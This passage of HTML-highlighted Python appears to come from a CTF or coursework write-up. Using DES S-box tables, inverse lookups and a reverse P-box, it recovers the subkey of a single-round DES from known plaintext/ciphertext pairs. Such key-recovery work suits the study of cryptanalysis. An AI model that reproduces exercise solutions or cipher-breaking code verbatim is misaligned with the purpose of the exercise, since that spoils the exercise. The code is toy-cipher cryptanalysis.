class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>],[<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>],[<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>],[<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>]]</span><br><span class="line">    Sbox5 = [[<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>],[<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>],[<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>],[<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>]]</span><br><span class="line">    Sbox6 = [[<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>],[<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>],[<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>]]</span><br><span class="line">    Sbox7 = [[<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>],[<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>],[<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>],[<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>]]</span><br><span class="line">    possible0 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox0)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox0[i])):</span><br><span class="line">            <span class="keyword">if</span> Sbox0[i][j] == <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b0,<span class="number">2</span>):</span><br><span class="line">                possible0.append(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">0</span>]+<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">4</span>)+<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">1</span>])</span><br><span class="line">    possible1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox1)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox1[i])):</span><br><span class="line">            <span class="keyword">if</span> Sbox1[i][j] == <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b1,<span class="number">2</span>):</span><br><span class="line">                possible1.append(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">0</span>]+<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">4</span>)+<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">1</span>])</span><br><span class="line">    possible2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox2)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox2[i])):</span><br><span class="line">            <span class="keyword">if</span> Sbox2[i][j] == <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b2,<span class="number">2</span>):</span><br><span class="line">                possible2.append(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">0</span>]+<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">4</span>)+<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">1</span>])</span><br><span class="line">    possible3 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox3)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox3[i])):</span><br><span class="line">            <span class="keyword">if</span> Sbox3[i][j] == <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b3,<span class="number">2</span>):</span><br><span class="line">                possible3.append(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">0</span>]+<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">4</span>)+<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">1</span>])</span><br><span class="line">    possible4 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox4)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox4[i])):</span><br><span class="line">            <span class="keyword">if</span> Sbox4[i][j] == <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b4,<span class="number">2</span>):</span><br><span class="line">                possible4.append(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">0</span>]+<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">4</span>)+<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">1</span>])</span><br><span class="line">    possible5 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox5)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox5[i])):</span><br><span class="line">            <span class="keyword">if</span> Sbox5[i][j] == <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b5,<span class="number">2</span>):</span><br><span class="line">                possible5.append(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">0</span>]+<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">4</span>)+<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">1</span>])</span><br><span class="line">    possible6 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox6)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox6[i])):</span><br><span class="line">            <span class="keyword">if</span> Sbox6[i][j] == <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b6,<span class="number">2</span>):</span><br><span class="line">                possible6.append(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">0</span>]+<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">4</span>)+<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">1</span>])</span><br><span class="line">    possible7 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox7)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Sbox7[i])):</span><br><span class="line">            <span class="keyword">if</span> Sbox7[i][j] == <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b7,<span class="number">2</span>):</span><br><span class="line">                possible7.append(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">0</span>]+<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">4</span>)+<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> possible0,possible1,possible2,possible3,possible4,possible5,possible6,possible7</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_item</span>(<span class="params">message</span>):</span><br><span class="line">    bitstream = <span class="built_in">bin</span>(message)[<span class="number">2</span>:].zfill(<span class="number">48</span>)</span><br><span class="line">    b0 = bitstream[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    b1 = bitstream[<span class="number">6</span>:<span class="number">12</span>]</span><br><span class="line">    b2 = bitstream[<span class="number">12</span>:<span class="number">18</span>]</span><br><span class="line">    b3 = bitstream[<span class="number">18</span>:<span class="number">24</span>]</span><br><span class="line">    b4 = bitstream[<span class="number">24</span>:<span class="number">30</span>]</span><br><span class="line">    b5 = bitstream[<span class="number">30</span>:<span class="number">36</span>]</span><br><span class="line">    b6 = bitstream[<span class="number">36</span>:<span class="number">42</span>]</span><br><span class="line">    b7 = bitstream[<span class="number">42</span>:<span class="number">48</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b0,<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b1,<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b2,<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b3,<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b4,<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b5,<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b6,<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+b7,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P_sub_rev</span>(<span class="params">message</span>):</span><br><span class="line">    bitstream = <span class="built_in">bin</span>(message)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    P_box_reverse = [<span class="number">9</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">25</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">32</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">27</span>, <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P_box_reverse)):</span><br><span class="line">        result += bitstream[P_box_reverse[i]-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+result,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F_process</span>(<span class="params">R,K</span>):</span><br><span class="line">    <span class="keyword">return</span> P_sub(S_sub(E_sub(R)^K))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DES_encryption_oneround</span>(<span class="params">m,k</span>):</span><br><span class="line">    M = IP_sub(m)</span><br><span class="line">    L,R = divide(M,<span class="number">64</span>)</span><br><span class="line">    temp = L</span><br><span class="line">    L = R</span><br><span class="line">    R = temp^F_process(R,k)</span><br><span class="line">    C = attach(L,R,<span class="number">64</span>)</span><br><span class="line">    C = IP_sub_reverse(C)</span><br><span class="line">    <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">input</span>()</span><br><span class="line">c = <span class="built_in">input</span>()</span><br><span class="line">L0,R0 = divide(IP_sub(<span class="built_in">int</span>(m,<span class="number">16</span>)),<span class="number">64</span>)</span><br><span class="line">L1,R1 = divide(IP_sub(<span class="built_in">int</span>(c,<span class="number">16</span>)),<span class="number">64</span>)</span><br><span class="line">before = R0</span><br><span class="line">after = R1^L0</span><br><span class="line">E_after = E_sub(before)</span><br><span class="line">P_before = P_sub_rev(after)</span><br><span class="line">possible0,possible1,possible2,possible3,possible4,possible5,possible6,possible7 = S_sub_rev(P_before)</span><br><span class="line">b0,b1,b2,b3,b4,b5,b6,b7 = gen_item(E_after)</span><br><span class="line"></span><br><span class="line">lt0,rt0 = divide(IP_sub(<span class="built_in">int</span>(<span class="string">&quot;0xfedcba9876543210&quot;</span>,<span class="number">16</span>)),<span class="number">64</span>)</span><br><span class="line">lt1,rt1 = divide(IP_sub(<span class="built_in">int</span>(<span class="string">&quot;0xf74ed54cb9001180&quot;</span>,<span class="number">16</span>)),<span class="number">64</span>)</span><br><span class="line">lt2,rt2 = divide(IP_sub(<span class="built_in">int</span>(<span class="string">&quot;0xabcdefabcdefabcd&quot;</span>,<span class="number">16</span>)),<span class="number">64</span>)</span><br><span class="line">lt3,rt3 = divide(IP_sub(<span class="built_in">int</span>(<span class="string">&quot;0xd5ec5f7f4c5f7d64&quot;</span>,<span class="number">16</span>)),<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bt1 = rt0</span><br><span class="line">at1 = rt1^lt0</span><br><span class="line">E_at1 = E_sub(bt1)</span><br><span class="line">t0,t1,t2,t3,t4,t5,t6,t7 = gen_item(E_at1)</span><br><span class="line">P_bt1 = P_sub_rev(at1)</span><br><span class="line"></span><br><span class="line">bt2 = rt2</span><br><span class="line">at2 = rt3^lt2</span><br><span class="line">E_at2 = E_sub(bt2)</span><br><span class="line">tt0,tt1,tt2,tt3,tt4,tt5,tt6,tt7 = gen_item(E_at2)</span><br><span class="line">P_bt2 = P_sub_rev(at2)</span><br><span class="line"></span><br><span class="line">Sbox0 = [[<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>],[<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>],[<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>],[<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>]]</span><br><span class="line">Sbox1 = [[<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>],[<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>],[<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>],[<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>]]</span><br><span class="line">Sbox2 = [[<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>],[<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>],[<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>],[<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>]]</span><br><span class="line">Sbox3 = [[<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>],[<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>],[<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>],[<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>]]</span><br><span class="line">Sbox4 = [[<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>],[<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>],[<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>],[<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>]]</span><br><span class="line">Sbox5 = [[<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>],[<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>],[<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>],[<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>]]</span><br><span class="line">Sbox6 = [[<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>],[<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>],[<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>]]</span><br><span class="line">Sbox7 = [[<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>],[<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>],[<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>],[<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span 